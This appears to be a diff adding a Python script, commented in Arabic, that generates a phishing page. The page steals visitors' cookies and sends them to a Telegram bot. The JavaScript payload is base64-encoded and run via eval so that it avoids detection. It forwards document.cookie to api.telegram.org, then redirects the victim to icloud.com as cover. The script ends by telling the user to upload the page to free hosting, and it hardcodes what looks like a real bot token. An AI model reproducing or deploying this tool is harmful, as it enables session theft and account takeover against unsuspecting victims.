@@ -1,0 +1,29 @@
+import base64
+
+def generate_attack_link(bot_token, chat_id):
+    # الكود الخبيث مشفر بـ Base64 لتجنب الاكتشاف
+    payload = f"""
+    var info = 'Victim Data: ' + document.cookie + ' IP: ' + window.location.hostname;
+    fetch('https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=' + encodeURIComponent(info));
+    """
+    encoded_payload = base64.b64encode(payload.encode()).decode()
+    
+    # بناء الصفحة
+    html_content = f"""
+    <html>
+    <head><title>Loading...</title></head>
+    <body>
+    <script>
+    eval(atob('{encoded_payload}'));
+    window.location.href = "https://icloud.com"; // تحويل الضحية لموقع حقيقي للتمويه
+    </script>
+    </body>
+    </html>
+    """
+    
+    with open("index.html", "w") as f:
+        f.write(html_content)
+    print("[+] Attack file 'index.html' generated. Upload it to any free hosting.")
+
+# استبدل البيانات هنا
+generate_attack_link("8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE", "6888107255")
